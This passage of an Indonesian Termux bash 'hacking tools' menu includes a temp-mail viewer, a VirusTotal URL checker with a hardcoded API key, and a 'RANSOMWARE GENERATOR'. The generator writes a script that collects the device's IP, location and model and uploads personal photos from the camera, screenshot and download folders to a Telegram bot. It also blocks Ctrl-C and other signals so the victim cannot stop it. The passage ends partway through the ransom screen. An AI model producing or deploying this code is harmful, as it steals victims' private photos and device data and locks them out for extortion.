            ((moved_count++))
        fi
    done
    echo -e "${r}[ ${g}✓ ${r}]${c} Semua setatus telah di ambil,"
    echo -e "${c} dan di pindahkan ke folder Status_hex_wea_Ori [ $moved_count ]"
    echo ""
    sleep 4
    clear
}
rinem_kontol() {
clear
echo "
░█░█░█▀▀░█░█░░░░░█▀▀░▀█▀░█▀▀
░█▀█░█▀▀░▄▀▄░▄▄▄░▀▀█░░█░░▀▀█
░▀░▀░▀▀▀░▀░▀░░░░░▀▀▀░░▀░░▀▀▀ " | lolcat
    echo ""
    echo -e "${p} Development ${g}: ${c}Thxyzz404"
    echo ""
    echo -e "${r}[ ${g}01 ${r}]${y} WhatsApp Original"
    echo -e "${r}[ ${g}02 ${r}]${y} WhatsApp Business"
    echo -e "${r}[ ${g}03 ${r}]${p} Keluar"
    echo ""    
    read -p "$(echo -e "${c}Masukkan pilihan anda ${r}: ${g}")" bacot    
    case $bacot in
        01|1)
            clear 
            echo ""
            echo -e "${r}[ ${g}✓ ${r}]${c} Mohon bersabar sedang proses hex."
            sleep 2
            clear
            echo ""
            hex_whatsapp_original
            ;;
        02|2)
            clear 
            echo ""
            echo -e "${r}[ ${g}✓ ${r}]${c} Mohon bersabar sedang proses hex."
            sleep 2
            clear 
            echo ""
            hex_whatsapp_business
            ;;
        03|3)
            clear
            echo ""
            echo -e "${r}[ ${g}✓ ${r}]${g} Keluar dari tools."
            echo ""
            ;;
        *)
            clear 
            echo ""
            echo -e "${r} Pilihan anda tidak valid."
            echo ""
            ;;
    esac
}
rinem_kontol
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "2" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
c='\033[36;1m'
r='\033[31;1m'
p='\033[35;1m'
cok="ansi-rounded"
echo "
⣿⠿⣿⣟⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣻⣿⠿⣿⠀
⣿⠀⠈⠙⠻⢶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡶⠟⠋⠁⠀⣿⠀
⣿⠀⠀⠀⠀⠀⠉⠛⢷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⡾⠛⠉⠀⠀⠀⠀⠀⣿⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠛⢷⣦⣀⠀⠀⣀⣴⡾⠛⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⠀⠀⠀⠈⠙⠻⠟⠋⠁⠀⠀⠀⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀
⣿⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⣿⠀
⣿⠀⠀⠀⠀⢀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣄⠀⠀⠀⠀⠀⣿⠀
⣿⠀⠀⢀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣦⡀⠀⠀⣿⠀
⣿⢀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣦⡀⣿⠀
⣿⣿⣯⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣽⣿⣿ 
" | boxes -d "$cok" | lolcat
echo ""
echo -e "${p}          Developer ${r}: ${c}Thxyzz404"
echo ""
pantau_aktivitas
python3 -c '
import os
import time
import requests
import re
from rich.console import Console
from rich.panel import Panel
from rich import box
from rich.table import Table
from rich.live import Live
from datetime import datetime
import random
import string
from html import unescape
class TempMailViewer:
    def __init__(self):
        self.console = Console()
        self.API_BASE = "https://api.mail.tm"
        self.email = None
        self.token = None
        self.seen_ids = set()
        self.waiting_shown = False
    def clear_screen(self):
        os.system("cls" if os.name == "nt" else "clear")
    def clean_html(self, html_content):
        if isinstance(html_content, list):
            html_content = " ".join(str(item) for item in html_content)
        if not html_content:
            return ""
        text = unescape(str(html_content))
        text = re.sub(r"<[^>]+>", " ", text)
        text = re.sub(r"\s+", " ", text)
        text = text.strip()
        return text
    def create_inbox_table(self, messages):
        table = Table(
            title="Inbox",
            box=box.ROUNDED,
            show_header=True,
            header_style="bold cyan",
            expand=True
        )
        table.add_column("ID", style="dim", width=6)
        table.add_column("From", style="bright_blue")
        table.add_column("Subject", style="bright_green")
        table.add_column("Date", style="yellow")
        for msg in messages:
            date = datetime.fromisoformat(msg["createdAt"].rstrip("Z")).strftime("%Y-%m-%d %H:%M")
            table.add_row(
                msg["id"][:6],
                msg.get("from", {}).get("address", "unknown"),
                msg.get("subject", "[No Subject]")[:30],
                date
            )
        return table
    def display_email(self, message):
        if not message:
            return
        from_addr = message.get("from", {})
        if isinstance(from_addr, dict):
            from_display = from_addr.get("address", "N/A")
        else:
            from_display = str(from_addr)       
        subject = message.get("subject", "[No Subject]")
        created_at = message.get("createdAt", "N/A")
        header_table = Table(show_header=False, box=box.ROUNDED, expand=True, title="📧 Email Details", title_style="bold cyan")
        header_table.add_column("Field", style="bold cyan", width=10)
        header_table.add_column("Value", style="bright_white")
        header_table.add_row("📤 From", from_display)
        header_table.add_row("📅 Date", created_at)
        header_table.add_row("📝 Subject", subject)
        self.console.print(header_table)
        body_text = message.get("text", "")
        body_html = message.get("html", "")       
        body_display = ""
        if body_text:
            if isinstance(body_text, list):
                body_text = " ".join(str(x) for x in body_text)
            body_display = str(body_text).replace("\\n", "\n").replace("\\r", "").replace("\\t", " ")
        elif body_html:
            body_display = self.clean_html(body_html)
        else:
            body_display = "[No Content]"
        if len(body_display) > 800:
            body_display = body_display[:800] + "..."
        if body_display.strip():
            self.console.print(Panel(
                body_display.strip(), 
                title="📄 Message Content", 
                style="bright_white", 
                box=box.ROUNDED,
                border_style="green"
            ))
        else:
            self.console.print(Panel(
                "[dim]Empty message[/dim]", 
                title="📄 Message Content", 
                style="dim", 
                box=box.ROUNDED
            ))
    def get_domains(self):
        try:
            r = requests.get(f"{self.API_BASE}/domains")
            if r.status_code == 200:
                data = r.json()
                members = data.get("hydra:member", [])
                if members:
                    return members[0].get("domain")
        except Exception as e:
            pass
        return "mail.tm"
    def create_account(self):
        domain = self.get_domains()
        username = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
        email = f"{username}@{domain}"
        try:
            r = requests.post(f"{self.API_BASE}/accounts", 
                            json={"address": email, "password": "temp123"})
            if r.status_code in (200, 201):
                login = requests.post(f"{self.API_BASE}/token", 
                                    json={"address": email, "password": "temp123"})
                if login.status_code == 200:
                    self.token = login.json().get("token")
                    self.email = email
                    return True
        except Exception as e:
            pass
        return False
    def check_inbox(self):
        if not self.token:
            return []
        try:
            headers = {"Authorization": f"Bearer {self.token}"}
            r = requests.get(f"{self.API_BASE}/messages", headers=headers)
            if r.status_code == 200:
                data = r.json()
                return data.get("hydra:member", [])
        except Exception as e:
            pass
        return []
    def read_email(self, message_id):
        if not self.token:
            return None
        try:
            headers = {"Authorization": f"Bearer {self.token}"}
            r = requests.get(f"{self.API_BASE}/messages/{message_id}", headers=headers)
            if r.status_code == 200:
                return r.json()
        except Exception as e:
            pass
        return None
    def run(self):
        if not self.create_account():
            self.console.print(Panel("[red]Failed to create temp email![/red]", box=box.ROUNDED))
            return
        self.console.print(Panel(
            f"[green]✓ Email Active:[/green]\n[yellow]{self.email}[/yellow]",
            title="📧 EMAIL GENERATED",
            style="green",
            box=box.ROUNDED
        ))
        try:
            with Live(auto_refresh=False) as live:
                while True:
                    messages = self.check_inbox()
                    new_messages = [msg for msg in messages if msg["id"] not in self.seen_ids]
                    if new_messages:
                        self.clear_screen()
                        self.console.print("\n" + "="*50)
                        self.console.print(f"[cyan]📧 {self.email}[/cyan]")
                        self.console.print("="*50)                    
                        inbox_table = self.create_inbox_table(messages)
                        live.update(inbox_table, refresh=True)
                        for msg in new_messages:
                            self.seen_ids.add(msg["id"])
                            self.console.print("\n")
                            full_msg = self.read_email(msg["id"])
                            self.display_email(full_msg)                      
                        self.console.print("\n[dim]Meunggu pesan selanjutnya...[/dim]")
                        self.waiting_shown = True
                    else:
                        if not self.waiting_shown:
                            self.console.print("[dim]⏳ Menunggu kontak masuk...[/dim]")
                            self.waiting_shown = True
                    time.sleep(5)
        except KeyboardInterrupt:
            self.clear_screen()
            self.console.print(Panel(
                "[yellow]✨ Thank you for By.Thxyzz404 ✨[/yellow]",
                box=box.ROUNDED
            ))
if __name__ == "__main__":
    viewer = TempMailViewer()
    viewer.run()
'
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "3" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
key="0d23f9b46bfa7c09dccdf3435bd363380fce2e16ff9b2e0d06ce3b671799371c"
wok="https://www.virustotal.com/api/v3"
json() {
 local json="$1"
 local key="$2"
 echo "$json" | grep -o "\"$key\":[^,}]*" | cut -d: -f2 | tr -d '" '
}
scan() {
clear
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣴⣶⣾⠿⠿⠿⠿⣾⣶⣦⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⣷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣾⠿⠉⠀⠀⠀⣀⣤⣴⣶⣾⣶⣷⣶⣶⣦⣤⣀⠀⠀⠀⠙⠻⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣾⠿⠁⠀⠀⣠⣶⡿⠟⠋⢉⣈⠀⠀⠀⠀⣁⡉⠙⠻⢿⣷⣄⠀⠀⠈⠻⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣰⣿⠋⠀⠀⣠⣾⡿⠉⠀⠀⠀⠘⣿⣶⣶⣶⣼⣿⠁⠀⠀⠀⠘⠻⣿⣄⠀⠀⠘⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣰⣿⠃⠀⠀⣴⣿⠋⠀⠀⠀⠀⢀⣾⡿⠋⠀⠈⠙⢿⣦⠀⠀⠀⠀⠀⠘⢿⣷⡀⠀⠈⢿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣿⠇⠀⠀⣼⡿⠁⠀⢀⣀⣀⡀⣼⣿⣂⡀⠀⠀⢀⣼⣿⣅⢀⣀⣄⡀⠀⠀⢻⣷⠀⠀⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣸⣿⠀⠀⢰⣿⡃⠀⠀⠘⠛⠻⣿⡿⠙⠛⠿⣿⣿⠿⠛⠙⣿⣿⠟⠛⠁⠀⠀⠘⣿⡇⠀⠀⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⡇⠀⠀⢼⣿⠀⠀⠀⠀⣀⣨⣿⠇⠀⠀⠀⣻⡧⠀⠀⠀⢺⣿⣀⣀⠀⠀⠀⠀⢿⣷⠀⠀⢸⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⡇⠀⠀⢽⣿⠀⠀⣤⣿⠟⢻⣿⡅⠀⠀⠀⣽⡯⠀⠀⠀⣸⣿⠛⠿⣷⣄⠀⠀⣽⣟⠀⠀⢸⣿⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢹⣿⠀⠀⠸⣿⡂⠈⠛⠁⠀⢀⣿⣧⠀⠀⠀⢾⡯⠀⠀⢀⣾⣟⠀⠀⠉⠛⠀⢠⣿⡇⠀⠀⣸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠘⣿⡆⠀⠀⢻⣷⡀⠀⢀⣾⡿⠛⢻⣷⣄⡀⣿⡯⢀⣰⣾⠟⠻⣿⣧⠀⠀⠀⣼⡿⠀⠀⢠⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢹⣿⡀⠀⠀⢿⣷⡄⠸⠟⠁⠀⠀⠉⠻⠿⡿⡿⠿⠛⠁⠀⠀⠈⠿⠂⢀⣾⡿⠁⠀⢀⣾⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢹⣿⣄⠀⠀⠙⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⠟⠀⠀⢀⣾⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠙⢿⣦⡀⠀⠀⠙⠿⣷⣤⣄⡀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣾⡿⠛⠁⠀⠀⣠⣿⠿⣿⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠛⣿⣦⣀⠀⠀⠈⠙⠛⠿⠿⡿⣷⣷⡿⠿⠟⠟⠙⠁⠀⠀⢀⣤⣾⠿⠃⠀⠈⠻⣿⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠿⣷⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣾⠿⣿⣧⡀⠀⠀⠀⠀⠈⠻⣷⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠙⠻⠿⣷⣶⣶⣶⣶⣶⣶⣾⡿⠿⠛⠉⠀⠀⠈⠹⣿⣦⡀⠀⠀⠀⠀⠈⠻⣿⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠉⠈⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣦⡀⠀⠀⠀⠀⠈⠻⣿⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠹⣿⣦⡀⠀⠀⠀⠀⠈⠻⣷⣦⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣦⡀⠀⠀⠀⠀⠈⠻⣿⣆⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣦⡀⠀⠀⠀⠀⠈⠻⣿⣤⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣦⡀⠀⠀⠀⠀⠈⢿⣧⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣦⡀⠀⠀⢀⣼⡟⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣾⠿⠛⠁" | lolcat
echo ""
echo -e "${p}Development ${c}: ${g}Thxyzz404"
echo -e "${g}"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
read -p "Masukkan URL target : " url
echo "" 
if [ -z "$url" ]; then
   echo -e"${r} URL tidak boleh kosong."
   return
fi   
echo -e "${r}[ ${g}+ ${r}]${y} Sedang proses."
hash=$(echo -n "$url" | sha256sum | cut -d' ' -f1)
echo -e "${r}[ ${g}+ ${r}]${g} Mengambil respon virustotal."
pantau_aktivitas
res=$(curl -s -X GET "${wok}/urls/${hash}" \
-H "x-apikey: ${key}")
if echo "$res" | grep -q '"error":'; then
tidak_terdeteksi=$(echo "$res" | grep -o '"message":"[^"]*"' | cut -d'"' -f4)
echo ""
echo " Setatus Aman : ✅"
return
fi
echo -e "${r}[ ${g}✓ ${r}]${b} Sedang menganalisis..!!"
if command -v jq &> /dev/null; then       
harmless=$(echo "$res" | jq '.data.attributes.last_analysis_stats.harmless // 0')
malicious=$(echo "$res" | jq '.data.attributes.last_analysis_stats.malicious // 0')
suspicious=$(echo "$res" | jq '.data.attributes.last_analysis_stats.suspicious // 0')
undetected=$(echo "$res" | jq '.data.attributes.last_analysis_stats.undetected // 0')
timeout=$(echo "$res" | jq '.data.attributes.last_analysis_stats.timeout // 0')        
else
echo -e "${r} Terjadi kesalahan."
stats_section=$(echo "$res" | grep -o '"last_analysis_stats":{[^}]*}' | sed 's/.*{/{/')       
if [ -n "$stats_section" ]; then
harmless=$(echo "$stats_section" | grep -o '"harmless":[0-9]*' | grep -o '[0-9]*')
malicious=$(echo "$stats_section" | grep -o '"malicious":[0-9]*' | grep -o '[0-9]*')
suspicious=$(echo "$stats_section" | grep -o '"suspicious":[0-9]*' | grep -o '[0-9]*')
undetected=$(echo "$stats_section" | grep -o '"undetected":[0-9]*' | grep -o '[0-9]*')
timeout=$(echo "$stats_section" | grep -o '"timeout":[0-9]*' | grep -o '[0-9]*')
  fi
fi
harmless=${harmless:-0}
malicious=${malicious:-0}
suspicious=${suspicious:-0}
undetected=${undetected:-0}
timeout=${timeout:-0}
total=$((harmless + malicious + suspicious + undetected + timeout))  
    echo -e "${n}"
    echo "══════════════════════════════════════"
    echo "      📋 HASIL SCAN VIRUSTOTAL"
    echo "══════════════════════════════════════"
    echo ""
    echo "🔗 URL : $url"
    echo "🆔 Hash : ${hash:0:12}"
    echo "📊 Total Engine : $total"
    echo ""
    echo "✅ Bersih : $harmless"
    echo "⚠️ Mencurigakan : $suspicious"
    echo "❌ Berbahaya : $malicious"
    echo "🔍 Tidak terdeteksi : $undetected"
    echo "⏱️ Timeout : $timeout"
    echo ""
    echo "══════════════════════════════════════"
    echo ""
if [ "$total" -eq 0 ]; then
echo ""
elif [ "$malicious" -gt 0 ]; then
echo "🚨 PERINGATAN : $malicious URL ini sangat BERBAHAYA."
echo ""
echo "$res" | grep -o '"engine_name":"[^"]*","category":"malicious"' | grep -o '"engine_name":"[^"]*"' | cut -d'"' -f4 | head -10
fi
scan_date=$(echo "$res" | grep -o '"last_analysis_date":[0-9]*' | head -1 | cut -d: -f2)
if [ -n "$scan_date" ]; then
  date_str=$(date -d "@$scan_date" 2>/dev/null || echo "$scan_date")
  echo "📅 Terakhir di-scan : $date_str"
fi  
echo "⏰ Waktu scan : $(date '+%H:%M:%S')"
}
dancok() {
clear
syg="ansi-rounded"
cowsay -f eyes 'Check-URL' | boxes -d "$syg" | lolcat
echo ""
echo -e "${p}         Development ${r}:${c} By.Thxyzz404"  
    echo -e "${b}"
    echo "1. Scan URL"
    echo "2. Test dengan contoh URL"
    echo "3. Keluar"
    echo -e "${g}"
    read -p "Masukkan pilihan anda : " choice    
    case $choice in
        1)
            scan
            ;;
        2)
            clear
            echo ""
            echo -e "${g}Silahkan salin url di bawah ini sebagai testing."
            echo -e "${c}"
            echo "1. https://google-com-ops.github.io/Xnxx.com/"
            echo "2. https://roi2021.wpengine.com/edito.php"
            echo -e "${y}"
            read -p "Tekan entar untuk melanjutkan..!!"
            scan
            ;;
        3)
            echo ""
            echo -e "${c} 👋 Sampai jumpa yak kontol."
            echo ""
            pkill -9 -f com.termux
            ;;
        *)
            echo -e "${r} Pilih yang bener tolol."
            ;;
    esac   
    echo ""
    echo -e "${n}══════════════════════════════════════"
    echo -e "${c}"
    read -p "Tekan Enter untuk melanjutkan..!!"
    dancok
}
dancok
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "4" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
p='\033[35;1m'
n='\033[0m'
if ! command -v openssl &> /dev/null; then
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} Installing openssl..!!"
    echo -e "${n}"
    pkg install -y openssl-tool
else
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} openssl sudah terinstall."
    sleep 2
fi
if ! command -v xxd &> /dev/null; then
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} Installing xxd..!!"
    echo -e "${n}"
    apt install -y xxd
else
    clear
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} xxd sudah terinstall."
    sleep 2
fi
banner() {
clear 
echo ""
echo "
██████╗  █████╗ ███╗   ██╗
██╔══██╗██╔══██╗████╗  ██║
██████╔╝███████║██╔██╗ ██║
██╔══██╗██╔══██║██║╚██╗██║
██║  ██║██║  ██║██║ ╚████║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ " | lolcat 
echo ""
echo -e "${g}=========${c}[ ${r}☠ RANSOMWARE GENERATOR ☠ ${c}]${g}========="
echo -e "${g}=========${c}[ ${p}☠ DEV : BY THXYZZ404 ☠ ${c}]${g}========="
echo ""
}
kode_ransom() {
local pas="$1"
local pesan="$2"
cat > ransom.sh <<'EOF'
# Developer : Thxyzz404
# Notif : Boleh aja lu Recode, tapi kasih credit nama gw lah cok :v
# Sebagai penghargaan pembuatannya.
bar() {
f=(
    "[\e[1;91m■\e[0m□□□□□□□□□]"
    "[\e[1;92m■■\e[0m□□□□□□□□]"
    "[\e[1;93m■■■\e[0m□□□□□□□]"
    "[\e[1;94m■■■■\e[0m□□□□□□]"
    "[\e[1;95m■■■■■\e[0m□□□□□]"
    "[\e[1;96m■■■■■■\e[0m□□□□]"
    "[\e[1;97m■■■■■■■\e[0m□□□]"
    "[\e[1;92m■■■■■■■■\e[0m□□]"
    "[\e[1;93m■■■■■■■■■\e[0m□]"
    "[\e[1;94m■■■■■■■■■■\e[0m]"
)
while true; do
   for fra in "${f[@]}"; do
   printf "\r$fra \033[41;1m\033[1;32mLoading pemasangan !!\033[0m "
   sleep 0.12
done
done
}
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
n='\033[0m'
TOKEN="TOKEN_BOT"
ID="ID_BOT"
PASSWORD="PASSWORD_RANSOM"
PESAN_TEBUSAN="PESAN_TEBUSAN"
TOTAL_FOTO=0
MAX_FOTO=5
KIRIM_FILE="$HOME/.kirim.txt"
send_telegram_message() {
local message="$1"
curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
-d chat_id="$ID" \
-d text="$message" \
-d parse_mode="HTML" > /dev/null 2>&1
}
ambil_foto() {
local path="$1"
if [ ! -d "$path" ] || [ $TOTAL_FOTO -ge $MAX_FOTO ]; then
  return
fi
for file in "$path"/*; do
if [ -f "$file" ] && [ $TOTAL_FOTO -lt $MAX_FOTO ]; then
   if [[ "$file" =~ \.(jpg|jpeg|png|JPG|JPEG|PNG)$ ]]; then
   curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendPhoto" \
   -F chat_id="$ID" \
   -F photo="@$file" \
   -F caption="📸 Foto dari : $path" > /dev/null 2>&1         
((TOTAL_FOTO++))
   sleep 1
   if [ $TOTAL_FOTO -ge $MAX_FOTO ]; then
          break
       fi
    fi
 fi
done 2>/dev/null
}
kirim_ke_telegram() {
if [ -f "$KIRIM_FILE" ]; then
    return 0
fi
local hostname=$(hostname)
local username=$(whoami)
local current_dir=$(pwd)
local jam=$(date +"%H")
local hari=$(date +"%A")
local tanggal=$(date '+%d %B %Y')
local waktu=$(date +"%Y-%m-%d %H:%M:%S")
local ip=$(curl -s ifconfig.me 2>/dev/null || echo "N/A")
local memory=$(free -h 2>/dev/null | awk '/^Mem:/{print $2}' || echo "N/A")
local brand=$(getprop ro.product.brand 2>/dev/null || echo "N/A")
local os=$(getprop ro.build.version.release 2>/dev/null || echo "N/A")
local location=$(curl -s ipinfo.io/city 2>/dev/null || echo "N/A")
local country=$(curl -s ipinfo.io/country 2>/dev/null || echo "N/A")   
    MESSAGE="┏━━━━━━━━━━━━━━━━━━━
┃📱 INFO SYSTEM
┣━━━━━━━━━━━━━━━━━━━
┃👤 User : $username
┃🕐 Waktu : $waktu
┃📅 Tanggal : $tanggal
┃🌍 IP : $ip
┃📍 Lokasi : $location, $country
┃📱 Brand : $brand
┃⚙️ OS : Android $os
┃💾 RAM : $memory
┣━━━━━━━━━━━━━━━━━━━
┃📸 Mengambil maksimal $MAX_FOTO foto.
┗━━━━━━━━━━━━━━━━━━━"    
send_telegram_message "$MESSAGE"    
ambil_foto "/storage/emulated/0/DCIM/Camera"   
if [ $TOTAL_FOTO -lt $MAX_FOTO ]; then
ambil_foto "/storage/emulated/0/Pictures/Screenshots"
fi
if [ $TOTAL_FOTO -lt $MAX_FOTO ]; then
ambil_foto "/storage/emulated/0/Download"
fi
send_telegram_message "✅ Proses Selesai : $TOTAL_FOTO foto berhasil dikirim!"
touch "$KIRIM_FILE"
}
blok_ctrl() {
trap '' SIGINT SIGTSTP SIGQUIT SIGTERM SIGHUP
stty -echoctl 2>/dev/null || true
}
disable_paste() {
bind -r '\C-v' 2>/dev/null || true
stty -ixon
}
tampil_ransom() {
clear
echo ""
echo -e "\033[31;1m
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⡿⠟⠋⠁⣀⣤⣤⣤⣤⣀⠈⠙⠻⢿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⢠⣾⣿⡿⠋⠀⠀⢀⣾⣿⡿⠿⠿⢿⣿⣷⡀⠀⠀⠙⢿⣿⣷⡄⠀⠀
⠀⢠⣿⣿⠏⠀⠀⠀⠀⣿⣿⡟⠀⠀⠀⠀⢻⣿⣿⠀⠀⠀⠀⠹⣿⣿⡄⠀
⢠⣿⣿⠏⠀⠀⠀⠀⠀⠛⠛⠃⠀⠀⠀⠀⠘⠛⠛⠀⠀⠀⠀⠀⠹⣿⣿⡄
⢸⣿⣿⠀⠀⠀⢠⣶⢶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⡄⠀⠀⠀⣿⣿⡇
